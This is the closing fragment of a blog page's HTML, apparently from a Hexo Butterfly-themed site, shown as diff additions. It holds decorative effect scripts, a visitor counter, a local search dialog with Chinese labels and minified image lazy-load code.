+})()</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="请输入搜索内容" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="js/search/local-search.js"></script></div></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>
